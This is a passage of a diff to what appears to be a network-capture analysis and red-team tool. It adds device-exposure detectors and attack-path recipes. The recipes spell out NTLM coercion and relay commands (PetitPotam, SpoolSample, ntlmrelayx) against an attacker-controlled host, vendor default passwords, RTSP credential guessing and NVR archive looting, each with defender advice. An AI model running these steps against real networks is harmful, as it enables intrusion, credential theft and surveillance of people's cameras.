+            "disable inverter at peak generation → wasted output. Coordinated, this "
+            "becomes a grid-stability concern.",
+            "Defender side: rotate installer PIN; air-gap the inverter management to "
+            "a dedicated VLAN; restrict cloud-bridge to vendor IPs.",
+        ],
+        "tools": ["curl + Burp", "vendor manuals",
+                  "metasploit aux/scanner/scada/{sma,fronius,enphase}_*"],
+    },
+    {
+        "id": "console-upnp-leak",
+        "name": "Game console — UPnP IGD punch-out → unintended WAN exposure",
+        "severity": "low",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["console"],
+        "description": ("Consoles aggressively punch WAN port-forwards via UPnP IGD "
+                        "during gameplay and voice chat. If the gateway honors UPnP, "
+                        "the console's services (chat servers, content sharing) "
+                        "become reachable from the internet."),
+        "steps": [
+            "Audit existing mappings on the gateway: `upnpc -l`. Anything with "
+            "`internal: <console-ip>` is what the console asked for.",
+            "Mappings often include 3074/UDP (Xbox Live), 3478-3480/UDP "
+            "(PSN STUN), 9293 (PS5 share). All are user-facing services with "
+            "their own protocol surfaces.",
+            "Demonstrate: outside the gateway, connect to the mapped WAN port → "
+            "reaches the console's server.",
+            "Defender side: disable UPnP on the gateway; rely on manual port-forwards "
+            "only.",
+        ],
+        "tools": ["upnpc (miniupnpc)", "nmap external scan of the WAN IP"],
+    },
+    {
+        "id": "nvr-mass-camera-takeover",
+        "name": "Surveillance NVR/DVR — central video archive + cred pivot",
+        "severity": "critical",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["NVR", "DVR"],
+        "description": ("NVR/DVR appliances aggregate every camera's archive plus "
+                        "the credentials needed to manage them. Same CVE families as "
+                        "the cameras themselves, with the added prize of a Linux "
+                        "shell on the management port that controls retention + export."),
+        "steps": [
+            "Hikvision/Dahua NVR: same auth-bypass family as the cameras "
+            "(CVE-2017-7921 / CVE-2021-33044). Try `http://<nvr>/Security/users` first.",
+            "Default creds: Hikvision `admin/12345`, Dahua `admin/admin` or "
+            "`888888/888888`, NUUO `admin/admin`.",
+            "If shelled: pull `cameras.json` / equivalent — contains every camera's "
+            "RTSP credential, frequently the same admin password reused.",
+            "Loot archive: NVRs commonly mount large disks at `/mnt/sda1/` with "
+            "`.mp4` recordings — exfil whatever's interesting before retention "
+            "rolls over.",
+            "Defender side: patch NVR firmware; force per-camera unique passwords; "
+            "isolate cameras + NVR to a no-egress VLAN.",
+        ],
+        "tools": ["curl + Burp", "metasploit hikvision/dahua modules",
+                  "ffmpeg (RTSP probe)", "NVR vendor CLI"],
+    },
+    {
+        "id": "rtsp-stream-scrape",
+        "name": "RTSP — anonymous stream scrape (mass camera/baby-monitor exposure)",
+        "severity": "medium",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["RTSP"],
+        "description": ("RTSP on tcp/554 often serves video without auth (or under a 2-char "
+                        "default basic-auth). Generic at the LAN level, mass-scaled at "
+                        "the internet level (Insecam-class)."),
+        "steps": [
+            "Probe paths: `ffprobe rtsp://<ip>/`. If 401, try `rtsp://admin:admin@<ip>/` "
+            "and the per-vendor defaults from `ipcam-default-rtsp`.",
+            "Path discovery: `cameradar -t <ip>` brute-forces ~120 known per-vendor paths "
+            "(Axis `/axis-media/media.amp`, Hikvision `/Streaming/Channels/1`, "
+            "Foscam `/videoMain`, Generic `/h264.sdp`).",
+            "Once a stream is open: `ffmpeg -i rtsp://<ip>/<path> -t 10 sample.mp4` for "
+            "proof; live viewing in VLC.",
+            "Defender side: require auth on every RTSP path; rotate from defaults; "
+            "consider RTSPS (TLS-wrapped) on modern firmware.",
+        ],
+        "tools": ["Cameradar", "ffmpeg / ffprobe", "VLC", "Wireshark RTP dissector"],
+    },
+    {
+        "id": "coerce-relay-chain",
+        "name": "Auth coercion → NTLM relay — PrinterBug / PetitPotam / DFSCoerce",
+        "severity": "critical",
+        "phase": "AD lateral",
+        "match_any_category": ["spoofable-resolution", "ntlm-capture", "smb"],
+        "description": ("Authentication coercion bugs in MS-RPRN (PrinterBug / SpoolSample), "
+                        "MS-EFSRPC (PetitPotam), MS-DFSNM (DFSCoerce), MS-FSRVP (ShadowCoerce) "
+                        "force any computer (including DCs) to NTLM-auth to an attacker-"
+                        "controlled UNC. Pair with ntlmrelayx → SMB / LDAP / AD CS targets."),
+        "steps": [
+            "Spin up the relay first: `impacket-ntlmrelayx -t <smb-target-no-signing> "
+            "-smb2support -socks` (or `-t ldap://<dc> --escalate-user <you>` to grant "
+            "DCSync rights, or `-t http://<adcs>/certsrv --adcs` for ESC8).",
+            "Coerce — pick whichever path the patches haven't closed: "
+            "`python3 PetitPotam.py -u '' -p '' <attacker> <victim>` (anon EFSRPC) / "
+            "`SpoolSample.exe \\\\<victim> \\\\<attacker>` / "
+            "`python3 dfscoerce.py -u <user> -p <pass> <attacker> <victim>` / "
+            "`ShadowCoerce.py`.",
+            "ntlmrelayx receives the auth and runs whichever target action you wired. "
+            "Common outcomes: --escalate-user grants DCSync; --adcs yields a cert in "
+            "the victim's name; -c '<cmd>' fires the command as SYSTEM on the SMB target.",
+            "Pivot via DCSync (`secretsdump -just-dc`) or via the AD CS cert "
+            "(`certipy auth`).",
+            "Defender side: patch (KB5005413 EFSRPC, KB5007090 DFSNM, etc.); enforce "
+            "SMB signing everywhere; channel-binding + RequireSSL on AD CS web.",
+        ],
+        "tools": ["impacket ntlmrelayx", "PetitPotam", "SpoolSample / Coercer",
+                  "dfscoerce", "ShadowCoerce", "Certipy"],
+    },
 ]
 
 
@@ -1011,6 +2946,12 @@ class PcapAnalysis:
         self._finding_seen = set()
 
         self.arp_table = defaultdict(set)
+        self._dhcp_by_mac = {}  # MAC -> {hostname, vendor_class} for 0.0.0.0-sourced DISCOVERs
+        # Background WHOIS prefetcher — every new public IP triggers an RDAP lookup
+        # in this small pool so labels light up without blocking parse.
+        self._whois_pool = ThreadPoolExecutor(max_workers=4, thread_name_prefix="whois")
+        self._whois_inflight = set()
+        self._whois_inflight_lock = threading.Lock()
         self.scan_pairs = defaultdict(set)
         self.scan_dport_by_dst = defaultdict(lambda: defaultdict(set))
         self.icmp_targets = defaultdict(set)
@@ -1023,6 +2964,12 @@ class PcapAnalysis:
         self.flow_packets = defaultdict(list)
         self._packet_counter = 0
         self.PACKET_CAP = 200000
+
+        # HTTP transaction log — req/resp pairs across all hosts, for the global feed.
+        self.http_txns = []
+        self._http_pending = {}     # (client_ip, client_port, server_ip, server_port) -> pending request
+        self.HTTP_TXN_CAP = 2000
+        self.HTTP_PAYLOAD_CAP = 4096
         self.PER_FLOW_CAP = 2000
         self.PAYLOAD_CAP = 2048
 
@@ -1046,8 +2993,148 @@ class PcapAnalysis:
                 "is_multicast": is_multicast_or_broadcast(ip),
                 "finding_keys": set(),
                 "risk_score": 0,
+                # identity
+                "vendor": None,
+                "device_type": None,
+                "hostname": None,
+                "dhcp_hostname": None,
+                "dhcp_vendor_class": None,
+                "nbns_name": None,
+                "mdns_local_name": None,
+                "ssdp_server": None,
+                "ssdp_friendly_name": None,
+                "rdns_name": None,
+                # WHOIS / RDAP (filled in by background prefetcher)
+                "whois_org": None,
+                "whois_country": None,
+                "whois_asn": None,
+                # Threat-intel — set of reputation-feed tags this IP appears on.
+                "reputation_tags": [],
+                "malicious": False,
             }
+            # Fire-and-forget RDAP lookup for new public hosts.
+            self._maybe_whois(ip)
+            # Quick reputation check (returns immediately if feeds aren't loaded yet —
+            # _finalize() does a second pass to cover the early-host case).
+            self._check_reputation(ip)
         return self.hosts[ip]
+
+    def _check_reputation(self, ip):
+        """Look an IP up in the loaded reputation feeds and populate host fields."""
+        if is_private(ip) or is_multicast_or_broadcast(ip):
+            return
+        try:
+            tags = reputation_feeds.lookup(ip)
+        except Exception:
+            return
+        if not tags:
+            return
+        h = self.hosts.get(ip)
+        if not h:
+            return
+        h["reputation_tags"] = tags
+        h["malicious"] = reputation_feeds.is_malicious(tags)
+
+    _HTTP_METHODS = ("GET ", "POST ", "PUT ", "DELETE ", "HEAD ", "OPTIONS ",
+                     "PATCH ", "CONNECT ", "TRACE ", "PROPFIND ", "PROPPATCH ",
+                     "MKCOL ", "MOVE ", "COPY ", "LOCK ", "UNLOCK ", "SUBSCRIBE ",
+                     "UNSUBSCRIBE ", "NOTIFY ", "M-SEARCH ")
+
+    def _d_http_transaction(self, ts, src, dst, sport, dport, http_text):
+        """Record an HTTP request/response pair into the global feed.
+
+        Pairing key uses the client side as origin: (client_ip, client_port, server_ip, server_port).
+        Requests originate from the client; responses come back with src/sport swapped.
+        Truncated to HTTP_PAYLOAD_CAP characters per direction.
+        """
+        if not http_text:
+            return
+        text = http_text[:self.HTTP_PAYLOAD_CAP]
+        # Request side: payload begins with a method token.
+        if any(text.startswith(m) for m in self._HTTP_METHODS):
+            key = (src, sport, dst, dport)   # client→server perspective
+            # Don't overflow pending dict on long-lived hosts; cap it.
+            if len(self._http_pending) > 4000:
+                self._http_pending.pop(next(iter(self._http_pending)), None)
+            self._http_pending[key] = {
+                "ts": ts, "client": src, "client_port": sport,
+                "server": dst, "server_port": dport, "request": text,
+            }
+            return
+        # Response side: starts with "HTTP/" — flip the key to find the pending request.
+        if text.startswith("HTTP/"):
+            key = (dst, dport, src, sport)   # client (was dst here) → server (was src here)
+            pending = self._http_pending.pop(key, None)
+            txn = {
+                "ts": ts,
+                "client": (pending or {}).get("client") or dst,
+                "client_port": (pending or {}).get("client_port") or dport,
+                "server": (pending or {}).get("server") or src,
+                "server_port": (pending or {}).get("server_port") or sport,
+                "request_ts": (pending or {}).get("ts"),
+                "request": (pending or {}).get("request"),
+                "response_ts": ts,
+                "response": text,
+            }
+            if len(self.http_txns) < self.HTTP_TXN_CAP:
+                self.http_txns.append(txn)
+            else:
+                # Drop the oldest so live captures don't grow unbounded.
+                self.http_txns.pop(0)
+                self.http_txns.append(txn)
+
+    def _maybe_whois(self, ip):
+        """Enqueue a background RDAP lookup for a freshly-seen public IP."""
+        if not HAS_IPWHOIS:
+            return
+        if is_private(ip) or is_multicast_or_broadcast(ip):
+            return
+        if ip in ("0.0.0.0", "255.255.255.255", "::"):
+            return
+        with self._whois_inflight_lock:
+            if ip in self._whois_inflight:
+                return
+            self._whois_inflight.add(ip)
+        try:
+            self._whois_pool.submit(self._do_whois, ip)
+        except Exception:
+            # Pool shut down — silently drop.
+            with self._whois_inflight_lock:
+                self._whois_inflight.discard(ip)
+
+    def _do_whois(self, ip):
+        """Worker: do the RDAP lookup, then write org/country/asn back onto the host."""
+        try:
+            result = whois_cache.lookup(ip)
+        except Exception:
+            return
+        if not result or result.get("error") or result.get("private"):
+            return
+        org = result.get("asn_description") or result.get("network_name") or None
+        # Trim the AS-prefix some RIRs include ("AS15169 GOOGLE, US") down to just the org name.
+        if org:
+            org = re.sub(r"^AS\d+\s+", "", org).strip()
+            # If trailing ", CC" exists and matches the country, peel it off so we don't double up.
+            cc = (result.get("asn_country") or result.get("network_country") or "").upper()
+            if cc and org.upper().endswith(", " + cc):
+                org = org[:-(len(cc) + 2)].rstrip()
+        country = (result.get("asn_country") or result.get("network_country") or None)
+        rdns = result.get("rdns")
+        with self.lock:
+            h = self.hosts.get(ip)
+            if not h:
+                return
+            if org and not h.get("whois_org"):
+                h["whois_org"] = org[:80]
+            if country and not h.get("whois_country"):
+                h["whois_country"] = country[:4].upper()
+            if result.get("asn") and not h.get("whois_asn"):
+                h["whois_asn"] = result["asn"]
+            if rdns and not h.get("rdns_name"):
+                h["rdns_name"] = rdns
+            # Refresh the picked hostname now that rDNS may have arrived.
+            if rdns and not h.get("hostname"):
+                h["hostname"] = pick_hostname(h)
 
     def _get_flow(self, src, dst):
         key = (src, dst)
@@ -1346,6 +3433,499 @@ class PcapAnalysis:
             except Exception:
                 pass
 
+    def _d_device_recon(self, ip, h):
+        """Map identity + listening ports → device-specific exposure findings.
+
+        Runs in _finalize() after vendor/device_type/ssdp_server/dhcp_vendor_class
+        are populated. Each finding fires under the 'device-exposure' category so
+        the attack-path recipes below can target them with substring matches.
+        """
+        # Skip pseudo-hosts and public IPs (these checks are for LAN-side gear).
+        if h.get("is_multicast") or ip in ("0.0.0.0", "255.255.255.255", "::"):
+            return
+        if not h.get("is_private"):
+            return
+
+        vendor = (h.get("vendor") or "")
+        dtype  = (h.get("device_type") or "")
+        srv    = (h.get("ssdp_server") or "")
+        dvc    = (h.get("dhcp_vendor_class") or "").lower()
+        ports  = h.get("ports_listening") or set()
+        srvL   = srv.lower()
+
+        def fire(sev, title, desc, evidence=None, rem=None, key=None):
+            self._add_finding(sev, "device-exposure", title, desc,
+                              hosts=[ip], evidence=evidence,
+                              remediation=rem,
+                              key=key or ("dev-exp", title, ip))
+
+        # --- routers / residential gateways / mesh nodes ---
+        if dtype in ("router", "router-or-mesh", "modem-gateway", "embedded-admin-ui",
+                     "dns-or-router", "router-or-ap") or "minimupnpd" in srvL or "internetgatewaydevice" in srvL:
+            admin = sorted(ports & {80, 443, 8080, 8443, 8000, 8888, 7547})
+            if admin:
+                fire("high",
+                     f"Router admin plane reachable on {ip}",
+                     f"{ip} ({vendor or 'unknown vendor'}) exposes admin/HTTP on {','.join(f':{p}' for p in admin)}. "
+                     f"Default-cred + known-CVE territory on consumer ISP gear.",
+                     evidence=f"vendor={vendor} ports={admin}",
+                     rem="Restrict admin UI to LAN-mgmt VLAN; rotate the default admin password.",
+                     key=("dev-router-admin", ip))
+
+        # --- set-top boxes (Zenterio/Telus pattern) ---
+        if (dtype == "stb"
+            or "zss/" in srvL or "dial-multiscreen" in srvL
+            or "uiw" in dvc or "telus" in dvc):
+            fire("medium",
+                 f"Set-top box detected at {ip}",
+                 f"STB/DIAL receiver — DIAL spec accepts unauthenticated app-launch POSTs; "
+                 f"GENA SUBSCRIBE CALLBACK is a common SSRF pivot; the boot-portal URL is "
+                 f"often plain HTTP and DHCP option 40 (upgrade-url) hijackable.",
+                 evidence=f"vendor={vendor} server={srv} dhcp_class={h.get('dhcp_vendor_class')}",
+                 rem="Audit the firmware: confirm signed updates, TLS pinning on portal URLs, "
+                     "and that DIAL launch endpoints validate Origin.",
+                 key=("dev-stb", ip))
+
+        # --- printers ---
+        if dtype == "printer" or 9100 in ports or 631 in ports or 515 in ports or 631 in ports:
+            present = sorted(ports & {9100, 631, 515, 80, 443, 23})
+            fire("high",
+                 f"Printer with management/print ports on {ip}",
+                 f"{vendor or 'printer'} exposes {','.join(f':{p}' for p in present)}. "
+                 f"9100/JetDirect + IPP + telnet legacies → PJL/PostScript injection, "
+                 f"address-book exfil, captured print jobs.",
+                 evidence=f"vendor={vendor} ports={present}",
+                 rem="ACL the printer; require IPP-over-TLS only; rotate admin web password.",
+                 key=("dev-printer", ip))
+
+        # --- IP cameras (Hikvision SDK 8000, Dahua 37777/37778, generic RTSP 554) ---
+        if (8000 in ports and 80 in ports) or "hikvision" in srvL:
+            fire("critical",
+                 f"Hikvision-pattern IP camera on {ip}",
+                 f"Port 8000 + 80 + 554 = Hikvision SDK/HTTP/RTSP. Default admin / 12345; "
+                 f"CVE-2017-7921 unauth config download.",
+                 evidence=f"ports={sorted(ports & {8000, 80, 443, 554})}",
+                 rem="Force-change default; firmware ≥ 2017-04 for CVE-2017-7921; "
+                     "isolate cameras to a VLAN with no LAN/Internet egress.",
+                 key=("dev-cam-hik", ip))
+        if 37777 in ports or 37778 in ports or "dahua" in srvL:
+            fire("critical",
+                 f"Dahua-pattern IP camera on {ip}",
+                 f"Port 37777/37778 = Dahua DVRIP. CVE-2021-33044/33045 auth bypass; "
+                 f"default 888888/888888 / 666666/666666.",
+                 evidence=f"ports={sorted(ports & {37777, 37778, 80, 554})}",
+                 rem="Patch to current firmware; restrict 37777 to NVR subnet only.",
+                 key=("dev-cam-dahua", ip))
+        if 554 in ports and dtype != "voip":
+            fire("medium",
+                 f"RTSP service on {ip}",
+                 f"RTSP often serves video without auth (or with weak digest). "
+                 f"Probe with `ffprobe rtsp://{ip}/live` to confirm a stream is reachable.",
+                 evidence=f"ports={sorted(ports & {554, 8554, 80})}",
+                 rem="Require auth on every RTSP path; better: TLS-wrapped RTSPS.",
+                 key=("dev-rtsp", ip))
+
+        # --- VoIP / SIP ---
+        if 5060 in ports or 5061 in ports or dtype == "voip":
+            fire("high",
+                 f"SIP/VoIP endpoint on {ip}",
+                 f"SIP REGISTER/INVITE is unauth-discoverable; weak digest auth → SIPVicious "
+                 f"crack; misconfigured PBX → toll fraud (calls billed to victim's account).",
+                 evidence=f"vendor={vendor} ports={sorted(ports & {5060, 5061, 80, 443})}",
+                 rem="Require TLS-SIP (5061) + SRTP; geo-fence allowed SIP peers; rate-limit "
+                     "INVITEs at the SBC.",
+                 key=("dev-voip", ip))
+
+        # --- TR-069 / CWMP exposed (residential gateway management) ---
+        if 7547 in ports or 30005 in ports:
+            fire("critical",
+                 f"TR-069 / CWMP ACS port on {ip}",
+                 f"TCP/7547 exposed (Mirai-class). NewNTPServer/SetParameterValues command "
+                 f"injection (CVE-2016-10372 et al.) → RCE on the gateway.",
+                 evidence=f"port=7547",
+                 rem="Restrict 7547 to the ISP's ACS source IP only; patch firmware.",
+                 key=("dev-cwmp", ip))
+
+        # --- MQTT (IoT broker) ---
+        if 1883 in ports or 8883 in ports:
+            fire("high",
+                 f"MQTT broker on {ip}",
+                 f"Default Mosquitto/HiveMQ allows anonymous CONNECT. Topic subscribe = "
+                 f"every device's telemetry; topic publish = control.",
+                 evidence=f"ports={sorted(ports & {1883, 8883})}",
+                 rem="Disable anonymous_access; require client cert auth on 8883.",
+                 key=("dev-mqtt", ip))
+
+        # --- Chromecast / DIAL / Google Cast (TLS 8009, HTTP 8008) ---
+        if 8008 in ports or 8009 in ports:
+            fire("medium",
+                 f"Chromecast / Google Cast device at {ip}",
+                 f"Cast accepts app-launch over local mDNS+HTTP — CSRF from any "
+                 f"webpage on the same LAN (CastHack 2014/2018). Receivers also load "
+                 f"unsigned manifest URLs.",
+                 evidence=f"ports={sorted(ports & {8008, 8009})}",
+                 rem="Cast guest-mode off if not needed; isolate cast targets to media VLAN.",
+                 key=("dev-cast", ip))
+
+        # --- IPMI BMC ---
+        if 623 in ports:
+            fire("critical",
+                 f"IPMI BMC exposed on {ip}",
+                 f"Port 623 = IPMI 2.0. RAKP+1 hash crack (mode 7300) yields root on the BMC "
+                 f"which yields KVM + virtual-media boot → host pwn.",
+                 evidence="port=623",
+                 rem="Move BMC to dedicated mgmt VLAN; disable cipher 0 / cipher 1; rotate "
+                     "default root password.",
+                 key=("dev-ipmi", ip))
+
+        # --- NAS (Synology / QNAP) ---
+        if dtype == "nas" or vendor in ("Synology", "QNAP"):
+            fire("high",
+                 f"NAS appliance ({vendor or 'unknown'}) at {ip}",
+                 f"Synology/QNAP have a long CVE history: DSM HTTP RCEs, photo-station "
+                 f"command injection, QSnatch/QLocker mass-targeting families.",
+                 evidence=f"vendor={vendor} ports={sorted(ports & {5000, 5001, 8080, 8443, 80, 443, 873, 548, 445})}",
+                 rem="Patch to current OS; expose only over VPN; rotate admin password; "
+                     "disable myQNAPcloud / QuickConnect unless required.",
+                 key=("dev-nas", ip))
+
+        # --- TFTP server (legacy config/firmware pull) ---
+        if 69 in ports:
+            fire("high",
+                 f"TFTP server on {ip}",
+                 f"UDP/69 TFTP = unauth read/write of router/switch/IP-phone configs "
+                 f"and firmware. Common on enterprise networks for config backup.",
+                 evidence="port=69",
+                 rem="Block TFTP at the edge; for legacy config-pull use SCP instead.",
+                 key=("dev-tftp", ip))
+
+        # --- WPS-capable radio (Quantenna chip in Telus mesh, etc.) ---
+        if vendor == "Quantenna" or "wfadevice" in srvL or "wfawlanconfig" in srvL:
+            fire("high",
+                 f"Wi-Fi radio with WPS service at {ip}",
+                 f"WPS PIN attacks (Pixie-Dust, Reaver) recover the WPA passphrase from "
+                 f"a single ~2 s online handshake on vulnerable chipsets.",
+                 evidence=f"vendor={vendor} server={srv}",
+                 rem="Disable WPS in the AP admin UI; if not possible, replace the AP.",
+                 key=("dev-wps", ip))
+
+        # --- Smart speaker / TV with HTTP control ---
+        if vendor in ("Sonos", "Roku") and (1400 in ports or 8060 in ports):
+            fire("low",
+                 f"Smart media device ({vendor}) at {ip}",
+                 f"Roku ECP (8060) / Sonos UPnP (1400) accept unauth commands on LAN: "
+                 f"channel/volume control, playback, queue manipulation. Not RCE — but "
+                 f"useful pivot for proximity confirmation / OPSEC denial.",
+                 evidence=f"ports={sorted(ports & {1400, 8060, 8009, 8008, 5353})}",
+                 rem="Segregate media VLAN; default DHCP on a separate SSID.",
+                 key=("dev-media", ip))
+
+        # --- smart TV (webOS / Tizen / Vizio / Roku TV) ---
+        if (dtype in ("tv", "tv-or-appliance", "tv-or-console")
+            or vendor in ("LG", "Samsung", "Vizio", "Sony")
+            and any(p in ports for p in (1925, 9197, 7000, 8060, 8001, 8002, 55000))):
+            fire("high",
+                 f"Smart TV ({vendor or 'unknown'}) at {ip}",
+                 f"Smart TV stacks (webOS, Tizen, Vizio SmartCast, Android TV) ship "
+                 f"old Chromium/WebKit and DIAL/HbbTV apps with little CSRF/CORS hygiene. "
+                 f"LAN-CSRF can drive the TV; some firmware exposes shell debug ports.",
+                 evidence=f"vendor={vendor} ports={sorted(ports & {1925, 8001, 8002, 9197, 7000, 8060, 55000})}",
+                 rem="Disconnect TV from primary LAN; isolate to a media VLAN with no "
+                     "egress to user devices; install vendor firmware updates promptly.",
+                 key=("dev-tv", ip))
+
+        # --- AirPlay receiver / Apple TV ---
+        if 7000 in ports or 7100 in ports or "_airplay" in srvL:
+            fire("medium",
+                 f"AirPlay receiver at {ip}",
+                 f"AirPlay 1 / 2 receivers (Apple TV, third-party speakers, modern TVs) "
+                 f"accept unauth media-push on LAN by default. CVE-2021-30892 / -30877 "
+                 f"old-Bonjour bugs are network-reachable.",
+                 evidence=f"ports={sorted(ports & {7000, 7100, 49152, 5000})}",
+                 rem="Require AirPlay password on each receiver; restrict to a Wi-Fi "
+                     "guest network; firmware ≥ tvOS 15.1.",
+                 key=("dev-airplay", ip))
+
+        # --- Plex Media Server ---
+        if 32400 in ports:
+            fire("high",
+                 f"Plex Media Server on {ip}",
+                 f"Port 32400 is Plex. CVE-2020-5740 deserialization → RCE; CVE-2023-25193 "
+                 f"plex relay token exposure; default install accepts the Plex.tv account "
+                 f"that registered the server (so the cloud-account compromise pivots in).",
+                 evidence="port=32400",
+                 rem="Patch to the latest build; require Plex Pass + per-server PIN; "
+                     "disable 'remote access' if not needed.",
+                 key=("dev-plex", ip))
+
+        # --- 3D printer / OctoPrint / Mainsail / Klipper ---
+        if (5000 in ports and 80 not in ports) or 7125 in ports or 7136 in ports or "octoprint" in srvL:
+            fire("high",
+                 f"3D-printer controller (OctoPrint/Klipper) on {ip}",
+                 f"OctoPrint/Klipper/Moonraker REST APIs ship with no auth by default. "
+                 f"G-code upload + start-print is whatever the printer can do — "
+                 f"thermal-runaway sabotage is realistic if checks are off.",
+                 evidence=f"ports={sorted(ports & {5000, 7125, 7136, 80})}",
+                 rem="Enable access control in OctoPrint; require API key for Moonraker; "
+                     "keep firmware thermal-runaway protection on.",
+                 key=("dev-octoprint", ip))
+
+        # --- Philips Hue / Lutron Caseta / smart-light hub ---
+        if "hue" in srvL or 4080 in ports or "_hue._tcp" in srvL or "lutron" in srvL or "caseta" in srvL:
+            fire("medium",
+                 f"Smart-light hub ({vendor or 'unknown'}) at {ip}",
+                 f"Philips Hue/Lutron Caseta hubs expose a local REST API; for Hue, a "
+                 f"single physical button press creates an authorized user — but "
+                 f"timing-bug / brute attacks have surfaced.",
+                 evidence=f"vendor={vendor} server={srv}",
+                 rem="Patch firmware; if mDNS leaks the hub to guest Wi-Fi, isolate it.",
+                 key=("dev-light-hub", ip))
+
+        # --- Network UPS / NUT (Network UPS Tools) ---
+        if 3493 in ports:
+            fire("medium",
+                 f"Network UPS server (NUT) on {ip}",
+                 f"NUT on tcp/3493 — `upsc <ups>@<host>` reads status without auth; "
+                 f"`upscmd` can shut the UPS down (and the load) with a captured "
+                 f"low-priv password.",
+                 evidence="port=3493",
+                 rem="Restrict 3493 to monitoring host; require auth on upscmd.",
+                 key=("dev-nut", ip))
+
+        # --- APC Network Management Card (NMC) / Eaton ePDU ---
+        if (vendor in ("APC", "Eaton") and (80 in ports or 443 in ports)) or "apc network management" in srvL:
+            fire("high",
+                 f"APC/Eaton power management card on {ip}",
+                 f"NMC default `apc/apc` admin; SNMP RW `private` very common. Once in: "
+                 f"`outlet off` cuts power, scheduled power-cycles disable services.",
+                 evidence=f"vendor={vendor} ports={sorted(ports & {22, 23, 80, 161, 443})}",
+                 rem="Rotate APC default; SNMPv3-authpriv only; segregate the power "
+                     "management plane onto a mgmt VLAN.",
+                 key=("dev-pdu", ip))
+
+        # --- PJLink network projector ---
+        if 4352 in ports:
+            fire("medium",
+                 f"PJLink projector control on {ip}",
+                 f"PJLink (port 4352) protocol is plaintext command/response. Default "
+                 f"password is empty or 'default' on most makes (Epson, NEC, Panasonic, "
+                 f"Sony, ViewSonic). Power on/off, source switch, freeze, fade-to-black.",
+                 evidence="port=4352",
+                 rem="Rotate the PJLink password; restrict to AV control VLAN.",
+                 key=("dev-pjlink", ip))
+
+        # --- Wireless presentation (Barco ClickShare / Mersive Solstice / Crestron AirMedia) ---
+        if (dtype == "embedded-admin-ui" and vendor in ("Barco", "Mersive", "Crestron")) \
+                or "clickshare" in srvL or "solstice" in srvL or "airmedia" in srvL:
+            fire("high",
+                 f"Wireless presentation device ({vendor or 'unknown'}) at {ip}",
+                 f"ClickShare / Solstice / AirMedia ship admin web UIs with vendor "
+                 f"defaults. CVE-2019-18827 / -18828 (Barco ClickShare) cred exposure; "
+                 f"Solstice admin web → guest-network creds + corp Wi-Fi PSK in plain.",
+                 evidence=f"vendor={vendor} server={srv}",
+                 rem="Rotate the device's admin password; disable the unprotected wired "
+                     "admin port; apply latest firmware.",
+                 key=("dev-wp", ip))
+
+        # --- Crestron Control / AMX commercial AV ---
+        if 41794 in ports or 41795 in ports:
+            fire("high",
+                 f"Crestron control processor on {ip}",
+                 f"Ports 41794/41795 are the Crestron CIP/Toolbox channels. Many "
+                 f"installations leave default `admin` with no password — full room "
+                 f"automation control (HVAC, blinds, displays).",
+                 evidence=f"ports={sorted(ports & {41794, 41795, 80, 443, 22, 23})}",
+                 rem="Set an admin password; disable Toolbox port if not used; "
+                     "segregate AV processor to its own VLAN.",
+                 key=("dev-crestron", ip))
+
+        # --- DLNA media server (generic UPnP MediaServer) ---
+        if "mediaserver" in srvL or "dlna" in srvL or 8200 in ports or 32469 in ports:
+            fire("low",
+                 f"DLNA media server at {ip}",
+                 f"UPnP MediaServer indexes shared content without auth. Often hosts "
+                 f"family-private content; some implementations (miniDLNA <1.1.5) had "
+                 f"path traversal that exposed arbitrary files (CVE-2020-12695).",
+                 evidence=f"server={srv} ports={sorted(ports & {8200, 32469, 80})}",
+                 rem="Patch miniDLNA; bind to LAN-only addresses; restrict shared "
+                     "directories to media-only folders.",
+                 key=("dev-dlna", ip))
+
+        # --- IoT hub (SmartThings, Hubitat, Wink, Vera, Home Assistant) ---
+        if ((8080 in ports or 8123 in ports or 39500 in ports)
+            and ("home_assistant" in srvL or "smartthings" in srvL or "hubitat" in srvL
+                 or "wink" in srvL or vendor in ("Samsung", "Wink", "Hubitat"))):
+            fire("high",
+                 f"Smart-home hub ({vendor or 'unknown'}) at {ip}",
+                 f"Smart-home hubs aggregate every IoT device on the LAN. API tokens "
+                 f"and stored cloud-account creds make the hub the highest-value LAN "
+                 f"pivot. CVE-2022-3859 / Home Assistant supervisor auth bypass class.",
+                 evidence=f"vendor={vendor} ports={sorted(ports & {8080, 8123, 39500, 443, 80})}",
+                 rem="Enable hub-side admin password; isolate hub VLAN; keep vendor "
+                     "firmware current.",
+                 key=("dev-iot-hub", ip))
+
+        # --- EV charger (OCPP WebSocket) / smart energy meter ---
+        if 9000 in ports and ("ocpp" in srvL or "chargepoint" in srvL or "easee" in srvL
+                              or "wallbox" in srvL or vendor in ("ChargePoint", "Wallbox", "Easee")):
+            fire("high",
+                 f"EV charger (OCPP) at {ip}",
+                 f"OCPP 1.6/2.0.1 over WebSocket on tcp/9000. Often deployed without "
+                 f"TLS or token auth, vulnerable to remote start/stop transaction + "
+                 f"meter manipulation (free charging fraud).",
+                 evidence=f"vendor={vendor} server={srv}",
+                 rem="Require OCPP-J over TLS with mutual auth; isolate charger LAN.",
+                 key=("dev-ev", ip))
+
+        # --- Solar inverter / energy monitor (SMA SunnyBoy, Fronius, Enphase Envoy) ---
+        if (vendor in ("SMA", "Fronius", "Enphase") and 80 in ports) or 9522 in ports or "fronius" in srvL or "envoy" in srvL or "sma " in srvL:
+            fire("medium",
+                 f"Solar inverter / energy monitor ({vendor or 'unknown'}) at {ip}",
+                 f"SMA SunnyBoy / Fronius Symo / Enphase Envoy web UIs default to "
+                 f"`installer` / vendor PIN derived from serial. SMA Speedwire on "
+                 f"UDP/9522 broadcasts grid stats unauth.",
+                 evidence=f"vendor={vendor} ports={sorted(ports & {80, 443, 9522})}",
+                 rem="Rotate installer PIN; firewall the inverter to the monitoring "
+                     "host; firmware patches.",
+                 key=("dev-solar", ip))
+
+        # --- Game console (PS5/PS4, Xbox) — UPnP/DLNA punch-out signal ---
+        if vendor in ("Sony", "Microsoft", "Nintendo") and (3074 in ports or 9293 in ports):
+            fire("low",
+                 f"Game console ({vendor}) at {ip}",
+                 f"Consoles aggressively use UPnP IGD to punch WAN ports inbound — "
+                 f"if the gateway honors it, the home network gets an unintended "
+                 f"WAN-facing chat/voice service. CVE-class but mostly recon-grade.",
+                 evidence=f"vendor={vendor} ports={sorted(ports & {3074, 9293, 5223, 80})}",
+                 rem="Disable UPnP on the gateway; rely on manual port-forwards.",
